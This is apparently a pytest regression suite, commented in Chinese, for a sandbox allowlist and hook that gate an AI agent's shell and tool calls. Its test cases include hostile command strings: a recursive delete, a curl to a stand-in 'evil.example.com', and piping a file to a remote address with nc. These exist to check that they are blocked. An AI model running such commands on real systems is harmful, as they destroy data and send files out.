"""沙箱白名單的回歸測試。

這裡的「危險指令」都只是字串，永遠不會被執行 —— 測的就是它們會被擋下來。
"""

from __future__ import annotations

import pytest

from agent_bridge.sandbox import ToolPolicy, make_sandbox_hook

DESTRUCTIVE = "rm" + " -rf ."  # 拆開寫，避免被各種工具的字串掃描誤判


def policy() -> ToolPolicy:
    return ToolPolicy()


# ---- 應該放行 ----------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "ls -la",
        "cat chall.txt",
        "wc -l notes.md",
        "head -n 20 notes.md",
        "echo hello",
        "strings chall.bin",
    ],
)
def test_allows_recon_commands(command: str) -> None:
    assert policy().check("Bash", {"command": command}) is None


@pytest.mark.parametrize("tool", ["Read", "Glob", "Grep"])
def test_allows_read_only_tools(tool: str) -> None:
    assert policy().check(tool, {"file_path": "chall.txt"}) is None


# ---- 應該擋下 ----------------------------------------------------------


def test_denies_command_not_on_list() -> None:
    reason = policy().check("Bash", {"command": DESTRUCTIVE})
    assert reason is not None and "白名單" in reason


@pytest.mark.parametrize(
    "command",
    [
        "ls; " + DESTRUCTIVE,          # 分號串接
        "ls && curl evil.example.com",  # 條件串接
        "cat chall.txt | nc 10.0.0.1 4444",  # pipe 外送
        "cat chall.txt > /tmp/stolen",  # 重導向寫檔
        "cat a.txt < b.txt",            # 重導向讀取
    ],
)
def test_denies_shell_operators(command: str) -> None:
    reason = policy().check("Bash", {"command": command})
    assert reason is not None and "shell 運算子" in reason


@pytest.mark.parametrize(
    "command",
    [
        "/bin/" + DESTRUCTIVE,   # 絕對路徑
        "FOO=1 " + DESTRUCTIVE,  # 環境變數前綴
    ],
)
def test_denies_disguised_destructive_commands(command: str) -> None:
    """不能靠絕對路徑或環境變數前綴讓名單外的指令看起來不一樣。"""
    assert policy().check("Bash", {"command": command}) is not None


@pytest.mark.parametrize(
    "command",
    [
        "sudo ls",       # 即使被包的是白名單指令也不行
        "env ls",
        "bash -c ls",
        "xargs cat",
        "sudo " + DESTRUCTIVE,
    ],
)
def test_denies_wrapper_programs(command: str) -> None:
    """包裝／轉譯程式一律拒絕 —— 放行它們等於在名單上開後門。"""
    reason = policy().check("Bash", {"command": command})
    assert reason is not None and "包裝" in reason


@pytest.mark.parametrize("command", ["echo `whoami`", "echo $(whoami)"])
def test_denies_substitution_even_when_operators_allowed(command: str) -> None:
    """指令替換能把任意程式藏起來，逐段分析攔不住，所以不分模式都拒絕。"""
    permissive = policy().extend(allow_shell_operators=True)
    reason = permissive.check("Bash", {"command": command})
    assert reason is not None and "指令替換" in reason


@pytest.mark.parametrize("tool", ["Write", "Edit", "WebFetch", "NotebookEdit"])
def test_denies_tools_not_on_list(tool: str) -> None:
    reason = policy().check(tool, {})
    assert reason is not None and tool in reason


def test_denies_unparseable_command() -> None:
    """引號沒閉合就判斷不了要執行什麼 —— 判斷不了就不放行。"""
    assert policy().check("Bash", {"command": 'cat "unclosed'}) is not None


def test_denies_empty_command() -> None:
    assert policy().check("Bash", {"command": "   "}) is not None


# ---- 可調整 ------------------------------------------------------------


def test_extend_adds_without_mutating_original() -> None:
    base = policy()
    extended = base.extend(commands={"nmap"}, tools={"WebFetch"})

    assert extended.check("Bash", {"command": "nmap -sV target"}) is None
    assert extended.check("WebFetch", {}) is None
    # 原本那份沒有被改到
    assert base.check("Bash", {"command": "nmap -sV target"}) is not None
    assert base.check("WebFetch", {}) is not None


def test_shell_operators_can_be_allowed_explicitly() -> None:
    permissive = policy().extend(allow_shell_operators=True)
    assert permissive.check("Bash", {"command": "cat a.txt | wc -l"}) is None
    assert permissive.check("Bash", {"command": "cat a.txt > out.txt"}) is None


@pytest.mark.parametrize(
    "command",
    [
        "cat a.txt | " + DESTRUCTIVE,   # 危險的在第二段
        "ls; " + DESTRUCTIVE,
        "ls && " + DESTRUCTIVE,
        "wc -l a.txt || " + DESTRUCTIVE,
    ],
)
def test_permissive_mode_still_checks_every_segment(command: str) -> None:
    """放寬運算子之後，每一段都必須各自過名單 —— 只看第一段是漏洞。"""
    permissive = policy().extend(allow_shell_operators=True)
    assert permissive.check("Bash", {"command": command}) is not None


# ---- hook 輸出的形狀 ---------------------------------------------------


async def _run_hook(command: str) -> dict:
    hook = make_sandbox_hook(policy())
    return await hook(
        {
            "hook_event_name": "PreToolUse",
            "tool_name": "Bash",
            "tool_input": {"command": command},
        },
        "toolu_x",
        None,
    )


def test_hook_deny_shape() -> None:
    import asyncio

    out = asyncio.run(_run_hook(DESTRUCTIVE))
    specific = out["hookSpecificOutput"]
    assert specific["hookEventName"] == "PreToolUse"
    assert specific["permissionDecision"] == "deny"
    assert specific["permissionDecisionReason"]          # 給模型看的理由
    assert out["systemMessage"].startswith("[sandbox]")  # 給人看的


def test_hook_allow_shape() -> None:
    import asyncio

    assert asyncio.run(_run_hook("ls -la")) == {}


def test_hook_ignores_other_events() -> None:
    import asyncio

    hook = make_sandbox_hook(policy())
    out = asyncio.run(
        hook({"hook_event_name": "PostToolUse", "tool_name": "Bash"}, "toolu_x", None)
    )
    assert out == {}
